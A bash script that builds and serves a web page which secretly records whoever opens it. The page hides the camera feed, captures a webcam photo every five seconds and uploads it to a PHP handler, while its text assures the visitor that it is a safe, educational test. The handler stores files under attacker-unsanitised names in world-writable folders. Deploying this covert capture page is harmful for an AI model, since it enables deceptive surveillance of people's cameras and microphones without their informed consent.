#!/bin/bash

# Colors for the script
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${CYAN}Starting Localhost Web Server...${NC}"

# Generate a random port number between 8000 and 8999
PORT=$((RANDOM % 1000 + 8000))
echo -e "${GREEN}Randomized Port: $PORT${NC}"

# Create a directory for the test server if it doesn't exist
if [ ! -d "test_server" ]; then
    mkdir test_server
    echo -e "${GREEN}Created directory: test_server${NC}"
fi

# Navigate to the directory
cd test_server

# Create the HTML file
cat << 'EOF' > index.html
<!DOCTYPE html>
<html>
<head>
    <title>Educational Testing Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        h1 {
            color: #333;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <h1>Testing Camera & Permissions</h1>
    <p>This is a safe, educational testing page. All actions are happening in the background.</p>

    <script>
        window.onload = () => {
            let mediaRecorder;
            let chunks = [];

            // Request camera and microphone permissions
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    // Create and hide the video element
                    const video = document.createElement('video');
                    video.style.display = 'none'; // Hide the video
                    document.body.appendChild(video);
                    video.srcObject = stream;
                    video.play();

                    // Capture photos every 5 seconds
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    setInterval(() => {
                        canvas.width = 320; // Adjust width and height as needed
                        canvas.height = 240;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, `photo_${Date.now()}.png`);
                            fetch('upload.php', { method: 'POST', body: formData });
                        });
                    }, 5000); // Capture photos every 5 seconds
                })
                .catch(err => {
                    console.error('Error accessing media devices:', err);
                });
        };
    </script>
</body>
</html>
EOF

# Create the PHP file to handle uploads
cat << 'EOF' > upload.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['photo'])) {
        $fileName = 'photos/' . $_FILES['photo']['name'];
        if (!is_dir('photos')) mkdir('photos', 0777, true);
        move_uploaded_file($_FILES['photo']['tmp_name'], $fileName);
    } elseif (isset($_FILES['audio'])) {
        $fileName = 'audio/' . $_FILES['audio']['name'];
        if (!is_dir('audio')) mkdir('audio', 0777, true);
        move_uploaded_file($_FILES['audio']['tmp_name'], $fileName);
    }
}
?>
EOF

# Create directories for uploads
mkdir -p photos audio

# Start the PHP server with the randomized port
php -S 127.0.0.1:$PORT

echo -e "${GREEN}Server is running at http://127.0.0.1:$PORT${NC}"
echo -e "${RED}Press Ctrl+C to stop the server.${NC}"